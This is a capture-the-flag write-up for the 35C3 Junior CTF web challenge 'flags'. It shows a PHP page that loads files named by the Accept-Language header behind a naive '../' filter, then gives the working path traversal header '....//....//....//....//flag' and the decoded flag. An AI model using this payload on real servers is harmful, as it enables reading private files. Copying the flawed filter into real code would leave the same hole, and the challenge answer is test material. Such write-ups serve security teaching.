<h1>35C3 Junior CTF â€“ flags</h1>

<ul>
<li><strong>Category:</strong> Web</li>
<li><strong>Points:</strong> 37 (variable)</li>
</ul>

<h2>Challenge</h2>

<blockquote>
  <p>Fun with flags: http://35.207.169.47</p>
  
  <p>Flag is at /flag</p>
  
  <p>Difficulty estimate: Easy</p>
</blockquote>

<h2>Solution</h2>

<p>The page shows the PHP snippet of which is composed and an image.</p>

<p>The PHP code is the following.</p>

<p><code>PHP
&lt;?php
  highlight_file(__FILE__);
  $lang = $_SERVER['HTTP_ACCEPT_LANGUAGE'] ?? 'ot';
  $lang = explode(',', $lang)[0];
  $lang = str_replace('../', '', $lang);
  $c = file_get_contents("flags/$lang");
  if (!$c) $c = file_get_contents("flags/ot");
  echo '&lt;img src="data:image/jpeg;base64,' . base64_encode($c) . '"&gt;';
</code></p>

<p>The web site extracts the language passed via HTTP header, considers the first language and tries to load a picture from the <code>flags</code> folder; that picture will be displayed.</p>

<p>Even if the <code>str_replace('../', '', $lang)</code> instruction is used, the path traversal vulnerability is still present and can be abused using <code>....//</code> instead of <code>../</code>.</p>

<p>After some attempts, you will discover the correct HTTP header to use.</p>

<p><code>
Accept-Language: ....//....//....//....//flag
</code></p>

<p>The returned "image" will be the following.</p>

<p><code>HTML
&lt;img src="data:image/jpeg;base64,MzVjM190aGlzX2ZsYWdfaXNfdGhlX2JlNXRfZmw0Zwo="&gt;
</code></p>

<p>Decoding the Base64 will give you the flag.</p>

<p><code>
35c3_this_flag_is_the_be5t_fl4g
</code></p>
